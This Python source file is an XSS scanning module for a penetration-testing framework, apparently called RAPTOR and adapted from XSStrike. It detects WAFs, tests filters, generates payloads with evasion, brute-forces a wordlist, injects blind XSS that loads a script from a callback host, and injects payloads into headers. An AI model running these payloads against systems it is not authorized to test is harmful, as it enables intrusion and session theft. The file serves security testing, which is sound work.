#!/usr/bin/env python3
"""
RAPTOR XSS Testing Module v3.0
================================
Cross-Site Scripting detection — XSStrike-grade intelligence inside RAPTOR.

Usage (CLI):
    python3 raptor.py -t example.com --modules xss

Integrates:
  - XSStrike-style context-aware reflection analysis
  - Filter/WAF probing per character & tag
  - Smart payload generation ranked by confidence
  - DOM source/sink scanning
  - Crawl-based form discovery
  - Bruteforce from wordlist  (wordlists/payloads/xss.txt)
  - Blind XSS with canary
  - Header injection
  - Full async, zero extra deps — uses BaseModule._make_request
"""

import re
import copy
import asyncio
import hashlib
import os
import sys
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, field
from urllib.parse import urljoin, parse_qs, urlparse, quote, unquote

from core.base_module import BaseModule, Finding


# ══════════════════════════════════════════════════════════════════════════════
#  Constants — ported from XSStrike core/config.py
# ══════════════════════════════════════════════════════════════════════════════

XSSCHECKER  = 'st4r7s'          # probe token (non-destructive)
MIN_EFFICIENCY = 90             # minimum fuzz match to report

# Characters / strings probed against filter
FILTER_PROBES = ['<', '>', '"', "'", ';', '(', ')', '{', '}',
                 'alert', 'script', 'onerror', 'onload', '-->', '</scRipT/>']

# Event handlers for payload generation
EVENT_HANDLERS = [
    'onload', 'onerror', 'onmouseover', 'onfocus', 'onclick',
    'onmouseenter', 'onpointerover', 'ontoggle', 'onanimationstart',
]

# HTML tags that can carry events
INJECTABLE_TAGS = [
    'img', 'svg', 'body', 'input', 'details', 'video',
    'audio', 'iframe', 'math', 'select', 'marquee',
]

# JS execution functions
JS_FUNCTIONS = ['alert(1)', 'confirm(1)', 'prompt(1)', 'console.log(1)']

# Fillings between tag name and event handler
FILLINGS = [' ', '\t', '\n', '/', '%09', '&#9;', '&#10;']

# WAF payload that should always trigger a block if WAF present
WAF_NOISE = '<script>alert("XSS")</script>'

# DOM sources regex
DOM_SOURCES = (
    r'\b(?:document\.(?:URL|documentURI|URLUnencoded|baseURI|cookie|referrer)'
    r'|location\.(?:href|search|hash|pathname)'
    r'|window\.name'
    r'|history\.(?:pushState|replaceState)'
    r'|(?:local|session)Storage)\b'
)

# DOM sinks regex
DOM_SINKS = (
    r'\b(?:eval|execCommand|assign|navigate|Function'
    r'|set(?:Timeout|Interval|Immediate)|execScript'
    r'|document\.(?:write|writeln)'
    r'|\.innerHTML|\.outerHTML'
    r'|\.insertAdjacentHTML'
    r'|(?:document|window)\.location)\b'
)


# ══════════════════════════════════════════════════════════════════════════════
#  Payload dataclass
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class XSSPayload:
    payload:    str
    context:    str          # html | attribute | script | url | style | dom | js_template
    confidence: int   = 5   # 1–11 (XSStrike scale)
    waf_bypass: List[str] = field(default_factory=list)
    severity:   str   = 'High'
    requires_interaction: bool = False


# ══════════════════════════════════════════════════════════════════════════════
#  Helpers
# ══════════════════════════════════════════════════════════════════════════════

def _load_payload_file() -> List[str]:
    """Load payloads from wordlists/payloads/xss.txt relative to project root."""
    search_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'wordlists', 'payloads', 'xss.txt'),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'wordlists', 'payloads', 'xss.txt'),
        'wordlists/payloads/xss.txt',
    ]
    for p in search_paths:
        try:
            with open(p, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            if lines:
                return lines
        except FileNotFoundError:
            continue
    # Built-in fallback — covers all contexts without external file
    return [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '<body onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '"><svg onload=alert(1)>',
        'javascript:alert(1)',
        '";alert(1);//',
        "';alert(1);//",
        '${alert(1)}',
        '<details ontoggle=alert(1) open>',
        '<input onfocus=alert(1) autofocus>',
        '<!--><img src=x onerror=alert(1)>',
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        '<img src=x onerror=\u0061lert(1)>',
        '<svg/onload=alert(1)>',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '<object data="data:text/html,<script>alert(1)</script>">',
    ]


def _random_upper(s: str) -> str:
    """Randomly uppercase chars — evades case-sensitive filters."""
    import random
    return ''.join(c.upper() if random.random() > 0.5 else c for c in s)


def _gen_html_payloads(allowed: Set[str]) -> List[str]:
    """Generate context-aware payloads for HTML context."""
    vectors = []
    can_open  = '<' in allowed
    can_close = '>' in allowed
    if not (can_open and can_close):
        return vectors
    for tag in INJECTABLE_TAGS:
        for ev in EVENT_HANDLERS:
            for fill in FILLINGS[:3]:
                for fn in JS_FUNCTIONS:
                    vectors.append(f'<{tag}{fill}{ev}={fn}>')
                    vectors.append(f'<{_random_upper(tag)}{fill}{_random_upper(ev)}={fn}>')
    # script break-out
    vectors.append('</script><script>alert(1)</script>')
    vectors.append('<script>alert(1)</script>')
    return vectors


def _gen_attribute_payloads(quote_char: str, allowed: Set[str]) -> List[str]:
    """Generate payloads for attribute context."""
    vectors = []
    q = quote_char or '"'
    if q in allowed:
        for fn in JS_FUNCTIONS:
            for ev in EVENT_HANDLERS[:4]:
                vectors.append(f'{q} {ev}={fn} {q}')
                vectors.append(f'{q} autofocus {ev}={fn} {q}')
        if '>' in allowed:
            vectors.append(f'{q}><img src=x onerror=alert(1)>')
    # escape attempt
    vectors.append(f'\\{q} autofocus onfocus=alert(1) \\{q}')
    vectors.append('javascript:alert(1)')
    return vectors


def _gen_script_payloads(quote_char: str) -> List[str]:
    """Generate payloads for script context."""
    q = quote_char or '"'
    vectors = []
    closers = [q + ';', q + '+', q + ')', ')']
    for closer in closers:
        for fn in JS_FUNCTIONS:
            vectors.append(f'{closer}alert(1)//')
            vectors.append(f'{closer}{fn}//')
    vectors.append('</script><script>alert(1)</script>')
    vectors.append('${alert(1)}')
    return vectors


# ══════════════════════════════════════════════════════════════════════════════
#  DOM analyser — ported from XSStrike dom.py (no color deps)
# ══════════════════════════════════════════════════════════════════════════════

def _dom_scan(response_text: str) -> List[Dict]:
    """
    Scan inline <script> blocks for dangerous source→sink flows.
    Returns list of {line_num, line, source, sink} dicts.
    """
    results = []
    scripts = re.findall(r'(?is)<script[^>]*>(.*?)</script>', response_text)
    for script in scripts:
        lines = script.split('\n')
        all_controlled: Set[str] = set()
        for num, raw_line in enumerate(lines, 1):
            line = raw_line
            controlled: Set[str] = set()

            # track variables that receive tainted sources
            parts = line.split('var ')
            if len(parts) > 1:
                for part in parts[1:]:
                    for cv in all_controlled:
                        if cv.replace('\\$', '$') in part:
                            m = re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]*', part)
                            if m:
                                controlled.add(m.group().replace('$', '\\$'))

            source_found = False
            for m in re.finditer(DOM_SOURCES, line):
                source_found = True
                source = m.group()
                # if the source is assigned to a var, track it
                for part in parts[1:]:
                    if source in part:
                        mv = re.search(r'[a-zA-Z$_][a-zA-Z0-9$_]*', part)
                        if mv:
                            controlled.add(mv.group().replace('$', '\\$'))
                results.append({'line': num, 'type': 'source', 'text': raw_line.strip(), 'match': source})

            all_controlled.update(controlled)

            # propagation — controlled variable used in this line
            for cv in all_controlled:
                if re.search(r'\b%s\b' % cv, line):
                    source_found = True

            # sinks
            for m in re.finditer(DOM_SINKS, line):
                results.append({'line': num, 'type': 'sink', 'text': raw_line.strip(), 'match': m.group()})

    return results


# ══════════════════════════════════════════════════════════════════════════════
#  HTML Parser — extracts reflection context (XSStrike htmlParser logic)
# ══════════════════════════════════════════════════════════════════════════════

def _html_parser(body: str, probe: str) -> Dict[int, Dict]:
    """
    Find all reflections of probe in body and characterise each context.
    Returns {position_index: {context, details}} matching XSStrike format.
    """
    body_lower = body.lower()
    probe_lower = probe.lower()
    occurences: Dict[int, Dict] = {}
    idx = 0

    start = 0
    while True:
        pos = body_lower.find(probe_lower, start)
        if pos == -1:
            break

        window_before = body[:pos]
        window_after  = body[pos + len(probe):]

        context  = 'html'
        details: Dict = {}

        # ── Script context ───────────────────────────────────────────────────
        open_script  = window_before.lower().rfind('<script')
        close_script = window_before.lower().rfind('</script')
        if open_script > close_script:
            context = 'script'
            # determine quote character around reflection
            script_inner = body[open_script:pos]
            quote_char = ''
            for ch in reversed(script_inner):
                if ch in ('"', "'", '`'):
                    quote_char = ch
                    break
            details['quote'] = quote_char
        else:
            # ── Attribute context ────────────────────────────────────────────
            last_open_tag = window_before.rfind('<')
            if last_open_tag != -1:
                tag_str = window_before[last_open_tag:]
                attr_match = re.search(
                    r'(\w[\w-]*)=["\']?[^"\']*$', tag_str
                )
                if attr_match and re.search(r'<[^>]*$', tag_str):
                    context = 'attribute'
                    details['name'] = attr_match.group(1)
                    quote_char = ''
                    after_eq = tag_str[attr_match.end(0) - len(attr_match.group(0).split('=')[1]):]
                    if after_eq and after_eq[0] in ('"', "'"):
                        quote_char = after_eq[0]
                    details['quote'] = quote_char
                    details['type']  = 'value'
                    # tag name
                    tag_name_m = re.match(r'<\s*(\w+)', tag_str)
                    details['tag'] = tag_name_m.group(1).lower() if tag_name_m else ''

            # ── Comment context ──────────────────────────────────────────────
            if context == 'html':
                if '<!--' in window_before and '-->' not in window_before[window_before.rfind('<!--'):]:
                    context = 'comment'

        occurences[idx] = {'context': context, 'details': details, 'position': pos}
        idx  += 1
        start = pos + 1

    return occurences


# ══════════════════════════════════════════════════════════════════════════════
#  XSSTester
# ══════════════════════════════════════════════════════════════════════════════

class XSSTester(BaseModule):
    """
    Advanced XSS detection module — XSStrike intelligence, RAPTOR integration.

    Invoked by raptor.py:
        async with XSSTester(config, stealth, db, graph) as m:
            findings = await m.run(target, **kwargs)
    """

    # ── Init ─────────────────────────────────────────────────────────────────

    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.findings:       List[Finding] = []
        self.tested_params:  Set[str]      = set()
        self.checked_forms:  Dict[str, List[str]] = {}
        self.waf_name:       Optional[str] = None

        # tunables from config / raptor kwargs
        self.evasion_level = config.get('evasion_level', 3)
        self.delay         = config.get('delay',         0)
        self.timeout       = config.get('request_timeout', 30)
        self.max_params    = config.get('max_params',    20)
        self.blind_cb      = config.get('blind_callback', '')

        # payload wordlist
        self.wordlist: List[str] = _load_payload_file()

    # ── Context managers ─────────────────────────────────────────────────────

    async def __aenter__(self):
        self.logger.info('🔥 XSS Module v3.0 initialising (XSStrike engine)')
        return self

    async def __aexit__(self, *_):
        return False

    # ══════════════════════════════════════════════════════════════════════════
    #  Public entry point
    # ══════════════════════════════════════════════════════════════════════════

    async def run(self, target: str, **kwargs) -> List[Finding]:
        scope = kwargs.get('scope', 'standard')
        self.logger.info(f'🚀 XSS scan → {target}  [scope: {scope}]')

        # ── Phase 1: WAF detection ────────────────────────────────────────────
        self.logger.info('🛡️  Phase 1: WAF detection')
        await self._detect_waf(target)

        # ── Phase 2: DOM analysis ─────────────────────────────────────────────
        self.logger.info('🌳 Phase 2: DOM source/sink analysis')
        await self._run_dom_scan(target)

        # ── Phase 3: Reflected XSS on URL parameters ──────────────────────────
        self.logger.info('🔍 Phase 3: URL parameter discovery + Reflected XSS')
        url_params = await self._discover_url_params(target)
        await self._test_reflected_xss(target, url_params)

        # ── Phase 4: Form-based XSS (crawl) ───────────────────────────────────
        if scope in ('standard', 'comprehensive', 'aggressive'):
            self.logger.info('📋 Phase 4: Form crawl + XSS')
            await self._crawl_forms(target)

        # ── Phase 5: Wordlist bruteforce ──────────────────────────────────────
        if scope in ('comprehensive', 'aggressive'):
            self.logger.info('💥 Phase 5: Wordlist bruteforce')
            await self._bruteforce(target, url_params)

        # ── Phase 6: Blind XSS ────────────────────────────────────────────────
        if scope in ('comprehensive', 'aggressive'):
            self.logger.info('👁️  Phase 6: Blind XSS')
            await self._test_blind_xss(target, url_params)

        # ── Phase 7: Header injection (aggressive) ────────────────────────────
        if scope == 'aggressive':
            self.logger.info('📡 Phase 7: Header XSS')
            await self._test_header_xss(target)

        self.logger.info(f'✅ XSS complete — {len(self.findings)} finding(s)')
        return self.findings

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 1 — WAF Detection  (XSStrike wafDetector logic)
    # ══════════════════════════════════════════════════════════════════════════

    async def _detect_waf(self, target: str):
        """Send a noisy payload and score against WAF signatures."""
        test_url = f'{target}?xss={quote(WAF_NOISE)}'
        resp = await self._make_request(test_url)
        if not resp:
            return

        page    = await resp.text()
        code    = str(resp.status)
        headers = str(resp.headers)

        # Basic scoring without external wafSignatures.json
        waf_indicators = {
            'Cloudflare':  [r'cloudflare', r'cf-ray'],
            'AWS WAF':     [r'aws.*waf', r'awselb'],
            'ModSecurity': [r'mod_security', r'modsecurity'],
            'Akamai':      [r'akamai', r'ak-hmac'],
            'Sucuri':      [r'sucuri', r'x-sucuri-id'],
            'Generic WAF': [r'blocked', r'forbidden', r'firewall', r'waf'],
        }

        if int(code) >= 400:
            for waf_name, patterns in waf_indicators.items():
                combined = (page + headers).lower()
                if any(re.search(p, combined, re.I) for p in patterns):
                    self.waf_name = waf_name
                    self.logger.warning(f'   ⚠️  WAF detected: {waf_name} — enabling evasion')
                    return
            # blocked but unrecognised
            self.waf_name = 'Unknown WAF'
            self.logger.warning('   ⚠️  WAF/IPS detected (unrecognised) — enabling evasion')

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 2 — DOM Scan
    # ══════════════════════════════════════════════════════════════════════════

    async def _run_dom_scan(self, target: str):
        resp = await self._make_request(target)
        if not resp:
            return
        body = await resp.text()
        hits = _dom_scan(body)
        if not hits:
            return

        sources = [h for h in hits if h['type'] == 'source']
        sinks   = [h for h in hits if h['type'] == 'sink']

        if sources and sinks:
            severity = 'High'
            desc     = 'DOM-based XSS: tainted sources flow into dangerous sinks.'
        elif sinks:
            severity = 'Medium'
            desc     = 'Dangerous DOM sinks found — manual review recommended.'
        else:
            severity = 'Low'
            desc     = 'DOM taint sources found — may reach sinks via application logic.'

        evidence_lines = '\n'.join(
            f"  Line {h['line']} [{h['type'].upper()}] {h['match']}: {h['text'][:120]}"
            for h in hits[:20]
        )

        finding = Finding(
            module      = 'xss',
            title       = f'[DOM] Potential DOM XSS — {len(sources)} source(s), {len(sinks)} sink(s)',
            severity    = severity,
            description = (
                f'## DOM-Based XSS Analysis\n\n{desc}\n\n'
                f'### Evidence\n```\n{evidence_lines}\n```\n\n'
                '### Impact\nUser-controlled data may reach dangerous DOM APIs '
                'allowing arbitrary JS execution without server interaction.\n\n'
                '### Remediation\nAvoid inserting user data into innerHTML, eval, '
                'document.write, or location. Use textContent and DOMParser instead.'
            ),
            evidence    = {'sources': len(sources), 'sinks': len(sinks), 'hits': hits[:20]},
            poc         = f'Review page source at: {target}',
            remediation = 'Replace dangerous sinks with safe DOM APIs; sanitise tainted sources.',
            cvss_score  = 7.1 if (sources and sinks) else 4.3,
            bounty_score= 2500 if (sources and sinks) else 500,
            target      = target,
        )
        self.findings.append(finding)
        self.add_finding(finding)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 3 — Reflected XSS  (XSStrike scan.py logic)
    # ══════════════════════════════════════════════════════════════════════════

    async def _discover_url_params(self, target: str) -> List[str]:
        """Extract real params from page links; fall back to common list."""
        common = [
            'q', 'search', 'query', 's', 'id', 'page', 'name', 'url',
            'redirect', 'next', 'return', 'callback', 'message', 'comment',
            'title', 'description', 'content', 'filter', 'sort', 'term',
            'email', 'username', 'token', 'ref', 'from', 'to', 'lang',
        ]
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())

        discovered: Set[str] = set()
        try:
            resp = await self._make_request(target)
            if resp:
                body  = await resp.text()
                links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', body, re.I)
                for link in links:
                    for k in parse_qs(urlparse(link).query).keys():
                        discovered.add(k)
        except Exception as e:
            self.logger.debug(f'Param discovery: {e}')

        if not discovered:
            discovered.update(common)
        return list(discovered)[:self.max_params]

    async def _test_reflected_xss(self, target: str, params: List[str]):
        """XSStrike-style: probe → parse → filter-check → generate → verify."""
        sem = asyncio.Semaphore(5)

        async def test_one(param: str):
            async with sem:
                if param in self.tested_params:
                    return
                await self._xsstrike_scan_param(target, param)

        await asyncio.gather(*[test_one(p) for p in params], return_exceptions=True)

    async def _xsstrike_scan_param(self, target: str, param: str):
        """
        Full XSStrike pipeline for one parameter:
          1. Send probe token
          2. Parse reflections + context  (htmlParser)
          3. Probe allowed chars          (filterChecker)
          4. Generate ranked vectors      (generator)
          5. Verify each vector           (checker)
        """
        probe = XSSCHECKER

        # ── Step 1: probe reflection ──────────────────────────────────────────
        test_url = self._build_url(target, param, probe)
        resp = await self._make_request(test_url)
        if not resp:
            return
        body = await resp.text()

        if probe.lower() not in body.lower():
            return  # param not reflected at all

        # ── Step 2: parse reflection context ─────────────────────────────────
        occurences = _html_parser(body, probe)
        if not occurences:
            return

        self.logger.info(f'   ↳ {param}: {len(occurences)} reflection(s)')

        # ── Step 3: filter check — which chars survive? ───────────────────────
        allowed = await self._filter_check(target, param, occurences)

        # ── Step 4: generate payloads ranked by confidence ────────────────────
        vectors = self._generate_vectors(occurences, allowed)

        # ── Step 5: verify each vector ────────────────────────────────────────
        for confidence, payloads in sorted(vectors.items(), reverse=True):
            for raw_payload in list(payloads)[:8]:
                success = await self._verify_payload(
                    target, param, raw_payload, occurences, confidence
                )
                if success:
                    self.tested_params.add(param)
                    return   # one confirmed finding per param is sufficient

    async def _filter_check(self, target: str, param: str,
                            occurences: Dict) -> Set[str]:
        """
        Probe each char/string in FILTER_PROBES and record which ones
        are reflected unmodified (i.e. allowed through the filter).
        """
        allowed: Set[str] = set()
        for probe_str in FILTER_PROBES:
            check_str = XSSCHECKER + probe_str + 'end'
            url = self._build_url(target, param, check_str)
            resp = await self._make_request(url)
            if not resp:
                continue
            body = await resp.text()
            if check_str.lower() in body.lower() or probe_str.lower() in body.lower():
                allowed.add(probe_str)
        return allowed

    def _generate_vectors(self, occurences: Dict,
                          allowed: Set[str]) -> Dict[int, Set[str]]:
        """
        Build ranked payloads for each reflection context.
        Returns {confidence_score: {payload, ...}} matching XSStrike format.
        """
        vectors: Dict[int, Set[str]] = {i: set() for i in range(1, 12)}

        for _, occ in occurences.items():
            ctx     = occ['context']
            details = occ.get('details', {})

            if ctx == 'html':
                for p in _gen_html_payloads(allowed):
                    vectors[10].add(p)
                # lower-confidence fallbacks
                vectors[6].add('<img src=x onerror=alert(1)>')
                vectors[6].add('<svg onload=alert(1)>')

            elif ctx == 'attribute':
                quote_char = details.get('quote', '"')
                for p in _gen_attribute_payloads(quote_char, allowed):
                    vectors[9].add(p)
                vectors[7].add(f'\\{quote_char} autofocus onfocus=alert(1) //')

            elif ctx == 'script':
                quote_char = details.get('quote', '"')
                for p in _gen_script_payloads(quote_char):
                    vectors[8].add(p)
                vectors[11].add(f'{quote_char}+alert(1)//')
                vectors[11].add(f'{quote_char};alert(1)//')

            elif ctx == 'comment':
                if '<' in allowed and '>' in allowed:
                    vectors[10].add('--><img src=x onerror=alert(1)>')
                    vectors[10].add('--><svg onload=alert(1)>')

        return vectors

    async def _verify_payload(self, target: str, param: str,
                              payload: str, occurences: Dict,
                              confidence: int) -> bool:
        """
        Re-send payload and measure match efficiency against reflection.
        Reports finding if efficiency ≥ MIN_EFFICIENCY.
        """
        test_url = self._build_url(target, param, payload)
        resp = await self._make_request(test_url)
        if not resp:
            return False
        body = await resp.text()

        # Quick string presence check first
        p_lower = payload.lower().replace('"', '').replace("'", '')
        if any(fragment in body.lower() for fragment in
               ['alert(1)', 'onerror=', 'onload=', 'onfocus=', 'javascript:']):
            # Do a fuzz-ratio estimation (poor-man's fuzz without fuzzywuzzy)
            efficiency = self._estimate_efficiency(body, payload)
            if efficiency >= MIN_EFFICIENCY:
                xss_type = self._classify_xss_type(occurences)
                finding  = self._create_finding(
                    target, param, payload, list(occurences.values())[0]['context'],
                    xss_type, confidence, efficiency
                )
                self.findings.append(finding)
                self.add_finding(finding)
                return True
        return False

    def _estimate_efficiency(self, body: str, payload: str) -> int:
        """
        Estimate how much of payload survived filtering (0-100).
        Replaces fuzzywuzzy.fuzz.partial_ratio with a pure-stdlib version.
        """
        body_lower    = body.lower()
        payload_lower = payload.lower()
        if payload_lower in body_lower:
            return 100
        # count matching chars in order
        matches = 0
        bi = 0
        for ch in payload_lower:
            idx = body_lower.find(ch, bi)
            if idx != -1:
                matches += 1
                bi = idx + 1
        return int(100 * matches / max(len(payload_lower), 1))

    def _classify_xss_type(self, occurences: Dict) -> str:
        ctx = list(occurences.values())[0]['context'] if occurences else 'html'
        return 'DOM-based' if ctx == 'dom' else 'Reflected'

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 4 — Form Crawl  (XSStrike crawl.py logic)
    # ══════════════════════════════════════════════════════════════════════════

    async def _crawl_forms(self, target: str):
        """Discover and test all HTML forms on the page."""
        resp = await self._make_request(target)
        if not resp:
            return
        body   = await resp.text()
        parsed = urlparse(target)
        scheme = parsed.scheme
        host   = parsed.netloc

        forms = re.findall(
            r'<form(?P<attrs>[^>]*)>(?P<inner>.*?)</form>',
            body, re.DOTALL | re.I
        )

        for attrs, inner in forms:
            # action URL
            action_m = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
            action   = action_m.group(1) if action_m else target

            if not action.startswith('http'):
                if action.startswith('//'):
                    action = f'{scheme}:{action}'
                elif action.startswith('/'):
                    action = f'{scheme}://{host}{action}'
                else:
                    action = f'{scheme}://{host}/{action}'

            method_m = re.search(r'method=["\'](\w+)["\']', attrs, re.I)
            method   = (method_m.group(1) if method_m else 'GET').upper()

            # collect inputs
            inputs: Dict[str, str] = {}
            for inp in re.finditer(
                r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
                inner, re.I
            ):
                inputs[inp.group(1)] = inp.group(2) or ''

            if not inputs:
                continue

            # track which params we've tested on this form
            if action not in self.checked_forms:
                self.checked_forms[action] = []

            for param in inputs:
                if param in self.checked_forms[action]:
                    continue
                self.checked_forms[action].append(param)
                await self._xsstrike_scan_param_form(action, method, inputs, param)

    async def _xsstrike_scan_param_form(self, url: str, method: str,
                                        base_params: Dict[str, str],
                                        target_param: str):
        """Run the XSStrike pipeline against a form parameter."""
        params_copy = copy.deepcopy(base_params)
        params_copy[target_param] = XSSCHECKER

        if method == 'POST':
            resp = await self._make_request(url, method='POST', data=params_copy)
        else:
            query = '&'.join(f'{k}={quote(v)}' for k, v in params_copy.items())
            resp  = await self._make_request(f'{url}?{query}')

        if not resp:
            return
        body = await resp.text()
        if XSSCHECKER not in body.lower():
            return

        occurences = _html_parser(body, XSSCHECKER)
        if not occurences:
            return

        allowed = await self._filter_check_form(url, method, base_params,
                                                target_param, occurences)
        vectors = self._generate_vectors(occurences, allowed)

        for confidence, payloads in sorted(vectors.items(), reverse=True):
            for raw_payload in list(payloads)[:5]:
                params_copy[target_param] = raw_payload
                if method == 'POST':
                    resp2 = await self._make_request(url, method='POST', data=params_copy)
                else:
                    query2 = '&'.join(f'{k}={quote(v)}' for k, v in params_copy.items())
                    resp2  = await self._make_request(f'{url}?{query2}')

                if not resp2:
                    continue
                body2 = await resp2.text()
                eff   = self._estimate_efficiency(body2, raw_payload)
                if eff >= MIN_EFFICIENCY:
                    finding = self._create_finding(
                        url, target_param, raw_payload,
                        list(occurences.values())[0]['context'],
                        'Reflected', confidence, eff
                    )
                    self.findings.append(finding)
                    self.add_finding(finding)
                    return

    async def _filter_check_form(self, url: str, method: str,
                                 base_params: Dict, target_param: str,
                                 occurences: Dict) -> Set[str]:
        allowed: Set[str] = set()
        for probe_str in FILTER_PROBES:
            check_str = XSSCHECKER + probe_str + 'end'
            params_copy = copy.deepcopy(base_params)
            params_copy[target_param] = check_str
            if method == 'POST':
                resp = await self._make_request(url, method='POST', data=params_copy)
            else:
                query = '&'.join(f'{k}={quote(v)}' for k, v in params_copy.items())
                resp  = await self._make_request(f'{url}?{query}')
            if not resp:
                continue
            body = await resp.text()
            if probe_str.lower() in body.lower():
                allowed.add(probe_str)
        return allowed

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 5 — Wordlist Bruteforce  (XSStrike bruteforcer logic)
    # ══════════════════════════════════════════════════════════════════════════

    async def _bruteforce(self, target: str, params: List[str]):
        """Send every payload from the wordlist for each parameter."""
        self.logger.info(f'   Bruteforcing {len(self.wordlist)} payloads × {len(params[:5])} params')
        sem = asyncio.Semaphore(5)

        async def try_payload(param: str, payload: str):
            async with sem:
                if param in self.tested_params:
                    return
                url  = self._build_url(target, param, payload)
                resp = await self._make_request(url)
                if not resp:
                    return
                body = await resp.text()
                eff  = self._estimate_efficiency(body, payload)
                if eff >= MIN_EFFICIENCY:
                    occurences = _html_parser(body, payload[:20])
                    ctx = list(occurences.values())[0]['context'] if occurences else 'html'
                    finding = self._create_finding(
                        target, param, payload, ctx, 'Reflected', 5, eff
                    )
                    self.findings.append(finding)
                    self.add_finding(finding)
                    self.tested_params.add(param)

        tasks = [
            try_payload(param, payload)
            for param in params[:5]                # cap params for bruteforce
            for payload in self.wordlist[:100]     # cap payloads per run
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 6 — Blind XSS
    # ══════════════════════════════════════════════════════════════════════════

    async def _test_blind_xss(self, target: str, params: List[str]):
        canary = hashlib.md5(target.encode()).hexdigest()[:8]
        cb_url = self.blind_cb or f'https://your-callback-server.com/x?c={canary}'

        blind_payloads = [
            f'<script src="{cb_url}"></script>',
            f'"><script src="{cb_url}"></script>',
            f'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{cb_url}\';document.head.appendChild(s)">',
        ]

        for param in params[:5]:
            for payload in blind_payloads:
                url = self._build_url(target, param, payload)
                await self._make_request(url)  # fire-and-forget

        finding = Finding(
            module      = 'xss',
            title       = f'[Blind XSS] Canary payload injected — awaiting callback',
            severity    = 'High',
            description = (
                f'## Blind XSS — Out-of-Band Detection\n\n'
                f'Canary `{canary}` injected into {len(params[:5])} parameter(s).\n\n'
                f'**Callback URL:** `{cb_url}`\n\n'
                'Monitor the callback server for incoming requests containing the canary.\n\n'
                '### Remediation\nEncode all user input on output; implement a strict CSP.'
            ),
            evidence    = {'canary': canary, 'callback': cb_url, 'params': params[:5]},
            poc         = f'Check {cb_url} for canary={canary}',
            remediation = 'Encode user-supplied output; set Content-Security-Policy.',
            cvss_score  = 7.5,
            bounty_score= 3000,
            target      = target,
        )
        self.findings.append(finding)
        self.add_finding(finding)

    # ══════════════════════════════════════════════════════════════════════════
    #  Phase 7 — Header Injection
    # ══════════════════════════════════════════════════════════════════════════

    async def _test_header_xss(self, target: str):
        headers_to_test = [
            'User-Agent', 'Referer', 'X-Forwarded-For',
            'X-Forwarded-Host', 'Origin', 'Accept-Language',
        ]
        payload = '<img src=x onerror=alert(1)>'

        for header in headers_to_test:
            resp = await self._make_request(target, headers={header: payload})
            if not resp:
                continue
            body = await resp.text()
            eff  = self._estimate_efficiency(body, payload)
            if eff >= MIN_EFFICIENCY:
                finding = self._create_finding(
                    target, header, payload, 'html', 'Header-based', 5, eff
                )
                self.findings.append(finding)
                self.add_finding(finding)

    # ══════════════════════════════════════════════════════════════════════════
    #  Finding factory
    # ══════════════════════════════════════════════════════════════════════════

    def _create_finding(self, target: str, param: str, payload: str,
                        context: str, xss_type: str,
                        confidence: int, efficiency: int) -> Finding:

        severity_map  = {'Stored': 'Critical', 'DOM-based': 'High',
                         'Reflected': 'High', 'Header-based': 'Medium',
                         'Blind': 'High'}
        cvss_map      = {'Stored': 9.1, 'DOM-based': 7.1,
                         'Reflected': 6.1, 'Header-based': 5.3, 'Blind': 7.5}
        bounty_map    = {'Stored': 5000, 'DOM-based': 2500,
                         'Reflected': 1500, 'Header-based': 1000, 'Blind': 3000}

        waf_note = (f'WAF detected ({self.waf_name}) — bypass techniques applied.'
                    if self.waf_name else 'No WAF detected.')

        return Finding(
            module      = 'xss',
            title       = f'[{xss_type}] XSS in "{param}" ({context} context)',
            severity    = severity_map.get(xss_type, 'High'),
            description = (
                f'## Cross-Site Scripting ({xss_type})\n\n'
                f'**Parameter:** `{param}`  \n'
                f'**Context:** {context}  \n'
                f'**Engine Confidence:** {confidence}/11  \n'
                f'**Filter Efficiency:** {efficiency}%  \n'
                f'**WAF:** {waf_note}\n\n'
                f'### Payload\n```html\n{payload}\n```\n\n'
                '### Impact\n'
                'Arbitrary JavaScript execution in victim browsers: '
                'session hijacking, credential theft, phishing, defacement.\n\n'
                '### Remediation\n'
                'Output-encode all user data; deploy Content-Security-Policy; '
                'use HTTPOnly + Secure cookie flags.'
            ),
            evidence    = {
                'parameter':  param,
                'payload':    payload,
                'context':    context,
                'xss_type':   xss_type,
                'confidence': confidence,
                'efficiency': efficiency,
                'waf':        self.waf_name,
            },
            poc         = f'Navigate to: {target}?{param}={quote(payload)}',
            remediation = (
                'Encode all user-supplied output (HTML, JS, URL context). '
                'Implement a strict Content-Security-Policy. '
                'Set HTTPOnly and Secure flags on session cookies.'
            ),
            cvss_score  = cvss_map.get(xss_type, 6.1),
            bounty_score= bounty_map.get(xss_type, 1500),
            target      = target,
        )

    # ══════════════════════════════════════════════════════════════════════════
    #  Helpers
    # ══════════════════════════════════════════════════════════════════════════

    def _build_url(self, base: str, param: str, value: str) -> str:
        """Append or replace a single parameter in the URL."""
        parsed = urlparse(base)
        qs     = parse_qs(parsed.query)
        qs[param] = [value]
        new_query = '&'.join(
            f'{k}={quote(v[0], safe="")}' for k, v in qs.items()
        )
        return parsed._replace(query=new_query).geturl()
